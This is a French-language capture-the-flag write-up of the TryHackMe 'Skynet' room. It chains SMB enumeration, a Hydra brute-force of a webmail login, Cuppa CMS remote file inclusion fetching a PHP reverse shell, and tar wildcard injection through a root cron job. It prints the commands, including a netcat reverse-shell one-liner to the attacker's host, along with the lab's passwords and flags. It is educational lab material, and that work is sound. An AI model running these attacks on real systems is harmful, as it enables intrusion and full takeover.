# 🤖 TryHackMe — Skynet Writeup

![Room](https://img.shields.io/badge/TryHackMe-Skynet-red?style=for-the-badge&logo=tryhackme)
![Difficulté](https://img.shields.io/badge/Difficulté-Easy-green?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux)
![Statut](https://img.shields.io/badge/Statut-Completed-brightgreen?style=for-the-badge)

> **Auteur :** [Matthieu-reseau-cyber](https://github.com/Matthieu-reseau-cyber/Matthieu-Portfolio-Reseau)  
> **Plateforme :** [TryHackMe](https://tryhackme.com)  
> **Room :** [Skynet](https://tryhackme.com/room/skynet)  
> **Date :** Juin 2026

---

## 📋 Sommaire

- [Description](#description)
- [Reconnaissance](#1--reconnaissance--nmap)
- [Énumération SMB](#2--énumération-smb)
- [Brute-force webmail](#3--brute-force-webmail-squirrelmail)
- [Accès SMB privé](#4--accès-smb-privé--répertoire-caché)
- [Exploitation RFI](#5--exploitation-rfi--cuppa-cms)
- [Escalade de privilèges](#6--escalade-de-privilèges--tar-wildcard)
- [Flags](#flags)
- [Outils utilisés](#outils-utilisés)
- [Leçons apprises](#leçons-apprises)

---

## Description

Skynet est une machine Linux de niveau **Easy** sur TryHackMe. Elle simule un environnement d'entreprise vulnérable inspiré du film Terminator. L'objectif est de compromettre la machine en enchaînant plusieurs vulnérabilités : énumération SMB, brute-force, Remote File Inclusion (RFI) et escalade de privilèges via une mauvaise configuration de cron avec tar.

**Compétences mises en œuvre :**
- Énumération réseau (Nmap, SMB, Gobuster)
- Brute-force d'authentification (Hydra)
- Exploitation RFI (Remote File Inclusion)
- Reverse shell PHP
- Privilege Escalation via tar wildcard injection

---

## 1 — Reconnaissance : Nmap

```bash
nmap -sV -sC -oN skynet.nmap 10.129.162.153
```

**Résultats :**

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.2p2 |
| 80 | HTTP | Apache 2.4.18 |
| 110 | POP3 | Dovecot |
| 139/445 | SMB | Samba 4.3.11 |
| 143 | IMAP | Dovecot |

> 📸 *[Screenshot : Résultats Nmap]*

**Analyse :** Présence de SMB (partages potentiellement accessibles) et d'un serveur web Apache. Ce sont nos premières cibles.

---

## 2 — Énumération SMB

### Listage des partages (anonyme)

```bash
smbclient -L //10.129.162.153 -N
```

**Partages découverts :**
- `anonymous` — accessible sans mot de passe
- `milesdyson` — protégé (intéressant !)

### Connexion au partage anonyme

```bash
smbclient //10.129.162.153/anonymous -N
```

Fichiers récupérés :
- `attention.txt` → message de Miles Dyson demandant à tous les employés de changer leurs mots de passe
- `logs/log1.txt` → liste de mots de passe potentiels

> 📸 *[Screenshot : Contenu des fichiers SMB]*

**Informations clés obtenues :**
- Utilisateur : `milesdyson`
- Wordlist de mots de passe : `log1.txt` (31 entrées)

---

## 3 — Brute-force webmail (SquirrelMail)

### Découverte du webmail

```bash
gobuster dir -u http://10.129.162.153 -w /usr/share/wordlists/dirb/common.txt -t 50
```

Répertoire trouvé : `/squirrelmail`

### Brute-force avec Hydra

```bash
hydra -l milesdyson -P log1.txt 10.129.162.153 \
  http-post-form "/squirrelmail/src/redirect.php:\
  login_username=^USER^&secretkey=^PASS^&\
  js_autodetect_results=1&just_logged_in=1:incorrect" -V
```

> 📸 *[Screenshot : Résultat Hydra]*

**Résultat :** Mot de passe trouvé → `cyborg007haloterminator`

### Lecture des emails

Connexion à `http://10.129.162.153/squirrelmail` avec `milesdyson:cyborg007haloterminator`.

Email de `skynet@skynet` — **Samba Password Reset** :
```
Password: )s{A&2Z=F^n_E.B`
```

> 📸 *[Screenshot : Email avec mot de passe SMB]*

---

## 4 — Accès SMB privé & répertoire caché

### Connexion au partage milesdyson

```bash
smbclient //10.129.162.153/milesdyson -U milesdyson \
  --password=')s{A&2Z=F^n_E.B`'
```

Fichier `notes/important.txt` :
```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

**Répertoire caché découvert :** `/45kra24zxs28v3yd`

### Énumération du répertoire caché

```bash
gobuster dir -u http://10.129.162.153/45kra24zxs28v3yd \
  -w /usr/share/wordlists/dirb/common.txt -t 50
```

**Trouvé :** `/45kra24zxs28v3yd/administrator` → Panel **Cuppa CMS**

> 📸 *[Screenshot : Panel Cuppa CMS]*

---

## 5 — Exploitation RFI : Cuppa CMS

### Vulnérabilité

Cuppa CMS est vulnérable à une **Remote File Inclusion (RFI)** via le paramètre `urlConfig` du fichier `alertConfigField.php`.

La RFI permet d'inclure un fichier distant (hébergé sur notre machine) et de l'exécuter côté serveur.

### Préparation du reverse shell

```bash
cp /usr/share/wordlists/SecLists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php .
sed -i 's/10.2.2.1/10.129.76.156/' php-reverse-shell.php
sed -i 's/8888/4444/' php-reverse-shell.php
```

### Exploitation

**Terminal 1 — Serveur HTTP :**
```bash
python3 -m http.server 80
```

**Terminal 2 — Listener Netcat :**
```bash
nc -lvnp 4444
```

**Déclenchement via le navigateur :**
```
http://10.129.162.153/45kra24zxs28v3yd/administrator/alerts/
alertConfigField.php?urlConfig=http://10.129.76.156/php-reverse-shell.php
```

> 📸 *[Screenshot : Reverse shell obtenu en www-data]*

**Résultat :** Shell obtenu en tant que `www-data`

### Flag utilisateur

```bash
cat /home/milesdyson/user.txt
```
```
7ce5c2109a40f958099283600a9ae807
```

---

## 6 — Escalade de privilèges : Tar Wildcard

### Analyse du crontab

```bash
cat /etc/crontab
```

```
*/1 * * * * root /home/milesdyson/backups/backup.sh
```

Le script `backup.sh` est exécuté **toutes les minutes par root** :

```bash
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

### Vulnérabilité

L'utilisation du **wildcard `*`** avec `tar` dans un répertoire où on a les droits d'écriture (`/var/www/html`) permet d'injecter des options à la commande tar via des noms de fichiers spéciaux.

### Exploitation — Tar Wildcard Injection

```bash
# Créer le reverse shell
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.129.76.156 5555 >/tmp/f' \
  > /var/www/html/shell.sh

# Créer les fichiers "checkpoint" qui seront interprétés comme des options tar
touch /var/www/html/--checkpoint=1
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
```

**Listener :**
```bash
nc -lvnp 5555
```

> 📸 *[Screenshot : Shell root obtenu]*

Après moins d'une minute, le cron s'exécute et déclenche le reverse shell en tant que **root**.

### Flag root

```bash
cat /root/root.txt
```
```
3f0372db24753accc7179a282cd6a949
```

---

## Flags

| Flag | Valeur |
|------|--------|
| 🏁 User flag | `7ce5c2109a40f958099283600a9ae807` |
| 🏆 Root flag | `3f0372db24753accc7179a282cd6a949` |

---

## Outils utilisés

| Outil | Usage |
|-------|-------|
| `nmap` | Scan de ports et détection de services |
| `smbclient` | Énumération et accès aux partages SMB |
| `gobuster` | Découverte de répertoires web |
| `hydra` | Brute-force d'authentification HTTP |
| `python3 -m http.server` | Serveur HTTP pour héberger le payload |
| `netcat` | Listener pour le reverse shell |
| PHP reverse shell | Obtention d'un shell distant |

---

## Leçons apprises

1. **SMB anonyme** peut exposer des informations critiques (wordlists, noms d'utilisateurs, répertoires cachés)
2. **La réutilisation de mots de passe** entre services (webmail → SMB) est une faiblesse courante
3. **Remote File Inclusion (RFI)** permet l'exécution de code arbitraire sans authentification si le CMS est non patché
4. **Tar wildcard injection** est une technique d'escalade de privilèges classique lorsqu'un script cron utilise `*` dans un répertoire accessible en écriture
5. Toujours vérifier les **crontabs système** lors d'une phase de post-exploitation

---

## Chaîne d'attaque complète

```
Nmap → SMB anonyme → Wordlist + Username
     → Hydra (webmail) → Mot de passe email
     → Email → Mot de passe SMB
     → SMB privé → Répertoire caché
     → Gobuster → Cuppa CMS
     → RFI → Reverse shell (www-data)
     → Crontab → Tar wildcard → Root
```

---

*Writeup réalisé dans un cadre légal et éducatif sur la plateforme TryHackMe.*
